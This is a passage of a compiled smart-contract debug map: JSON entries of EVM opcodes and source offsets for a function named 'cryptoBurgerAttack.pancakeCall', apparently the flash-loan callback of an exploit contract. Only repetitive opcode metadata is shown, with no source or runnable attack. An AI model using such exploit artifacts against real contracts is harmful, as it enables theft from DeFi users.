      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8376": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10550,
        10551
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8378": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10569,
        10573
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8379": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10515,
        10521
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8382": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10515,
        10576
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8383": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10515,
        10576
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8384": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10586,
        10647
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 79,
      "value": "0x20F3"
    },
    "8387": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8389": {
      "op": "DUP1"
    },
    "8390": {
      "op": "MLOAD"
    },
    "8391": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8393": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8396": {
      "op": "DUP4"
    },
    "8397": {
      "op": "CODECOPY"
    },
    "8398": {
      "op": "DUP2"
    },
    "8399": {
      "op": "MLOAD"
    },
    "8400": {
      "op": "SWAP2"
    },
    "8401": {
      "op": "MSTORE"
    },
    "8402": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8404": {
      "op": "DUP1"
    },
    "8405": {
      "op": "MLOAD"
    },
    "8406": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8408": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8411": {
      "op": "DUP4"
    },
    "8412": {
      "op": "CODECOPY"
    },
    "8413": {
      "op": "DUP2"
    },
    "8414": {
      "op": "MLOAD"
    },
    "8415": {
      "op": "SWAP2"
    },
    "8416": {
      "op": "MSTORE"
    },
    "8417": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10607,
        10619
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8428": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10621,
        10622
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8430": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10640,
        10644
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8431": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10586,
        10592
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8434": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10586,
        10647
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8435": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10586,
        10647
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8436": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10657,
        10718
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 80,
      "value": "0x2127"
    },
    "8439": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8441": {
      "op": "DUP1"
    },
    "8442": {
      "op": "MLOAD"
    },
    "8443": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8445": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8448": {
      "op": "DUP4"
    },
    "8449": {
      "op": "CODECOPY"
    },
    "8450": {
      "op": "DUP2"
    },
    "8451": {
      "op": "MLOAD"
    },
    "8452": {
      "op": "SWAP2"
    },
    "8453": {
      "op": "MSTORE"
    },
    "8454": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8456": {
      "op": "DUP1"
    },
    "8457": {
      "op": "MLOAD"
    },
    "8458": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8460": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8463": {
      "op": "DUP4"
    },
    "8464": {
      "op": "CODECOPY"
    },
    "8465": {
      "op": "DUP2"
    },
    "8466": {
      "op": "MLOAD"
    },
    "8467": {
      "op": "SWAP2"
    },
    "8468": {
      "op": "MSTORE"
    },
    "8469": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10678,
        10690
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8480": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10692,
        10693
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8482": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10711,
        10715
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8483": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10657,
        10663
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8486": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10657,
        10718
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8487": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10657,
        10718
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8488": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10728,
        10789
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 81,
      "value": "0x215B"
    },
    "8491": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8493": {
      "op": "DUP1"
    },
    "8494": {
      "op": "MLOAD"
    },
    "8495": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8497": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8500": {
      "op": "DUP4"
    },
    "8501": {
      "op": "CODECOPY"
    },
    "8502": {
      "op": "DUP2"
    },
    "8503": {
      "op": "MLOAD"
    },
    "8504": {
      "op": "SWAP2"
    },
    "8505": {
      "op": "MSTORE"
    },
    "8506": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8508": {
      "op": "DUP1"
    },
    "8509": {
      "op": "MLOAD"
    },
    "8510": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8512": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8515": {
      "op": "DUP4"
    },
    "8516": {
      "op": "CODECOPY"
    },
    "8517": {
      "op": "DUP2"
    },
    "8518": {
      "op": "MLOAD"
    },
    "8519": {
      "op": "SWAP2"
    },
    "8520": {
      "op": "MSTORE"
    },
    "8521": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10749,
        10761
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8532": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10763,
        10764
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8534": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10782,
        10786
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8535": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10728,
        10734
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8538": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10728,
        10789
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8539": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10728,
        10789
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8540": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10799,
        10860
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 82,
      "value": "0x218F"
    },
    "8543": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8545": {
      "op": "DUP1"
    },
    "8546": {
      "op": "MLOAD"
    },
    "8547": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8549": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8552": {
      "op": "DUP4"
    },
    "8553": {
      "op": "CODECOPY"
    },
    "8554": {
      "op": "DUP2"
    },
    "8555": {
      "op": "MLOAD"
    },
    "8556": {
      "op": "SWAP2"
    },
    "8557": {
      "op": "MSTORE"
    },
    "8558": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8560": {
      "op": "DUP1"
    },
    "8561": {
      "op": "MLOAD"
    },
    "8562": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8564": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8567": {
      "op": "DUP4"
    },
    "8568": {
      "op": "CODECOPY"
    },
    "8569": {
      "op": "DUP2"
    },
    "8570": {
      "op": "MLOAD"
    },
    "8571": {
      "op": "SWAP2"
    },
    "8572": {
      "op": "MSTORE"
    },
    "8573": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10820,
        10832
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8584": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10834,
        10835
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8586": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10853,
        10857
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8587": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10799,
        10805
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8590": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10799,
        10860
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8591": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10799,
        10860
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8592": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10870,
        10931
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 83,
      "value": "0x21C3"
    },
    "8595": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8597": {
      "op": "DUP1"
    },
    "8598": {
      "op": "MLOAD"
    },
    "8599": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8601": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8604": {
      "op": "DUP4"
    },
    "8605": {
      "op": "CODECOPY"
    },
    "8606": {
      "op": "DUP2"
    },
    "8607": {
      "op": "MLOAD"
    },
    "8608": {
      "op": "SWAP2"
    },
    "8609": {
      "op": "MSTORE"
    },
    "8610": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8612": {
      "op": "DUP1"
    },
    "8613": {
      "op": "MLOAD"
    },
    "8614": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8616": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8619": {
      "op": "DUP4"
    },
    "8620": {
      "op": "CODECOPY"
    },
    "8621": {
      "op": "DUP2"
    },
    "8622": {
      "op": "MLOAD"
    },
    "8623": {
      "op": "SWAP2"
    },
    "8624": {
      "op": "MSTORE"
    },
    "8625": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10891,
        10903
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8636": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10905,
        10906
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8638": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10924,
        10928
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8639": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10870,
        10876
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8642": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10870,
        10931
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8643": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10870,
        10931
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8644": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10941,
        11002
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 84,
      "value": "0x21F7"
    },
    "8647": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8649": {
      "op": "DUP1"
    },
    "8650": {
      "op": "MLOAD"
    },
    "8651": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8653": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8656": {
      "op": "DUP4"
    },
    "8657": {
      "op": "CODECOPY"
    },
    "8658": {
      "op": "DUP2"
    },
    "8659": {
      "op": "MLOAD"
    },
    "8660": {
      "op": "SWAP2"
    },
    "8661": {
      "op": "MSTORE"
    },
    "8662": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8664": {
      "op": "DUP1"
    },
    "8665": {
      "op": "MLOAD"
    },
    "8666": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8668": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8671": {
      "op": "DUP4"
    },
    "8672": {
      "op": "CODECOPY"
    },
    "8673": {
      "op": "DUP2"
    },
    "8674": {
      "op": "MLOAD"
    },
    "8675": {
      "op": "SWAP2"
    },
    "8676": {
      "op": "MSTORE"
    },
    "8677": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10962,
        10974
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8688": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10976,
        10977
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8690": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10995,
        10999
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8691": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10941,
        10947
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8694": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10941,
        11002
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8695": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10941,
        11002
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8696": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11012,
        11073
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 85,
      "value": "0x222B"
    },
    "8699": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8701": {
      "op": "DUP1"
    },
    "8702": {
      "op": "MLOAD"
    },
    "8703": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8705": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8708": {
      "op": "DUP4"
    },
    "8709": {
      "op": "CODECOPY"
    },
    "8710": {
      "op": "DUP2"
    },
    "8711": {
      "op": "MLOAD"
    },
    "8712": {
      "op": "SWAP2"
    },
    "8713": {
      "op": "MSTORE"
    },
    "8714": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8716": {
      "op": "DUP1"
    },
    "8717": {
      "op": "MLOAD"
    },
    "8718": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8720": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8723": {
      "op": "DUP4"
    },
    "8724": {
      "op": "CODECOPY"
    },
    "8725": {
      "op": "DUP2"
    },
    "8726": {
      "op": "MLOAD"
    },
    "8727": {
      "op": "SWAP2"
    },
    "8728": {
      "op": "MSTORE"
    },
    "8729": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11033,
        11045
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8740": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11047,
        11048
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8742": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11066,
        11070
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8743": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11012,
        11018
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8746": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11012,
        11073
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8747": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11012,
        11073
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8748": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11083,
        11144
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 86,
      "value": "0x225F"
    },
    "8751": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8753": {
      "op": "DUP1"
    },
    "8754": {
      "op": "MLOAD"
    },
    "8755": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8757": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8760": {
      "op": "DUP4"
    },
    "8761": {
      "op": "CODECOPY"
    },
    "8762": {
      "op": "DUP2"
    },
    "8763": {
      "op": "MLOAD"
    },
    "8764": {
      "op": "SWAP2"
    },
    "8765": {
      "op": "MSTORE"
    },
    "8766": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8768": {
      "op": "DUP1"
    },
    "8769": {
      "op": "MLOAD"
    },
    "8770": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8772": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8775": {
      "op": "DUP4"
    },
    "8776": {
      "op": "CODECOPY"
    },
    "8777": {
      "op": "DUP2"
    },
    "8778": {
      "op": "MLOAD"
    },
    "8779": {
      "op": "SWAP2"
    },
    "8780": {
      "op": "MSTORE"
    },
    "8781": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11104,
        11116
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8792": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11118,
        11119
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8794": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11137,
        11141
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8795": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11083,
        11089
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8798": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11083,
        11144
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8799": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11083,
        11144
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8800": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11154,
        11215
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 87,
      "value": "0x2293"
    },
    "8803": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8805": {
      "op": "DUP1"
    },
    "8806": {
      "op": "MLOAD"
    },
    "8807": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8809": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8812": {
      "op": "DUP4"
    },
    "8813": {
      "op": "CODECOPY"
    },
    "8814": {
      "op": "DUP2"
    },
    "8815": {
      "op": "MLOAD"
    },
    "8816": {
      "op": "SWAP2"
    },
    "8817": {
      "op": "MSTORE"
    },
    "8818": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8820": {
      "op": "DUP1"
    },
    "8821": {
      "op": "MLOAD"
    },
    "8822": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8824": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8827": {
      "op": "DUP4"
    },
    "8828": {
      "op": "CODECOPY"
    },
    "8829": {
      "op": "DUP2"
    },
    "8830": {
      "op": "MLOAD"
    },
    "8831": {
      "op": "SWAP2"
    },
    "8832": {
      "op": "MSTORE"
    },
    "8833": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11175,
        11187
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8844": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11189,
        11190
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8846": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11208,
        11212
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8847": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11154,
        11160
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8850": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11154,
        11215
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8851": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11154,
        11215
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8852": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11225,
        11286
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 88,
      "value": "0x22C7"
    },
    "8855": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8857": {
      "op": "DUP1"
    },
    "8858": {
      "op": "MLOAD"
    },
    "8859": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8861": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8864": {
      "op": "DUP4"
    },
    "8865": {
      "op": "CODECOPY"
    },
    "8866": {
      "op": "DUP2"
    },
    "8867": {
      "op": "MLOAD"
    },
    "8868": {
      "op": "SWAP2"
    },
    "8869": {
      "op": "MSTORE"
    },
    "8870": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8872": {
      "op": "DUP1"
    },
    "8873": {
      "op": "MLOAD"
    },
    "8874": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8876": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8879": {
      "op": "DUP4"
    },
    "8880": {
      "op": "CODECOPY"
    },
    "8881": {
      "op": "DUP2"
    },
    "8882": {
      "op": "MLOAD"
    },
    "8883": {
      "op": "SWAP2"
    },
    "8884": {
      "op": "MSTORE"
    },
    "8885": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11246,
        11258
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8896": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11260,
        11261
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8898": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11279,
        11283
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8899": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11225,
        11231
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8902": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11225,
        11286
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8903": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11225,
        11286
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8904": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11296,
        11357
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 89,
      "value": "0x22FB"
    },
    "8907": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8909": {
      "op": "DUP1"
    },
    "8910": {
      "op": "MLOAD"
    },
    "8911": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8913": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8916": {
      "op": "DUP4"
    },
    "8917": {
      "op": "CODECOPY"
    },
    "8918": {
      "op": "DUP2"
    },
    "8919": {
      "op": "MLOAD"
    },
    "8920": {
      "op": "SWAP2"
    },
    "8921": {
      "op": "MSTORE"
    },
    "8922": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8924": {
      "op": "DUP1"
    },
    "8925": {
      "op": "MLOAD"
    },
    "8926": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8928": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8931": {
      "op": "DUP4"
    },
    "8932": {
      "op": "CODECOPY"
    },
    "8933": {
      "op": "DUP2"
    },
    "8934": {
      "op": "MLOAD"
    },
    "8935": {
      "op": "SWAP2"
    },
    "8936": {
      "op": "MSTORE"
    },
    "8937": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11317,
        11329
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8948": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11331,
        11332
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8950": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11350,
        11354
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8951": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11296,
        11302
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8954": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11296,
        11357
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8955": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11296,
        11357
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8956": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11442
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 90,
      "value": "0x1"
    },
    "8958": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11442
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "8959": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "8961": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "8962": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "8967": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "8969": {
      "op": "SHL"
    },
    "8970": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "DUP2",
      "path": "0"
    },
    "8971": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "8972": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11461,
        11465
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8973": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "8975": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "DUP3",
      "path": "0"
    },
    "8976": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "ADD",
      "path": "0"
    },
    "8977": {
      "op": "MSTORE"
    },
    "8978": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11368,
        11528
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2391"
    },
    "8981": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11368,
        11528
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "8982": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8984": {
      "op": "DUP1"
    },
    "8985": {
      "op": "MLOAD"
    },
    "8986": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8988": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8991": {
      "op": "DUP4"
    },
    "8992": {
      "op": "CODECOPY"
    },
    "8993": {
      "op": "DUP2"
    },
    "8994": {
      "op": "MLOAD"
    },
    "8995": {
      "op": "SWAP2"
    },
    "8996": {
      "op": "MSTORE"
    },
    "8997": {
      "offset": [
        986,
        1028
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "8998": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "9000": {
      "op": "DUP1"
    },
    "9001": {
      "op": "MLOAD"
    },
    "9002": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "9004": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "9007": {
      "op": "DUP4"
    },
    "9008": {
      "op": "CODECOPY"
    },
    "9009": {
      "op": "DUP2"
    },
    "9010": {
      "op": "MLOAD"
    },
    "9011": {
      "op": "SWAP2"
    },
    "9012": {
      "op": "MSTORE"
    },
    "9013": {
      "offset": [
        814,
        856
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9014": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "9016": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "9018": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "9020": {
      "op": "SHL"
    },
    "9021": {
      "op": "SUB"
    },
    "9022": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11442
      ],
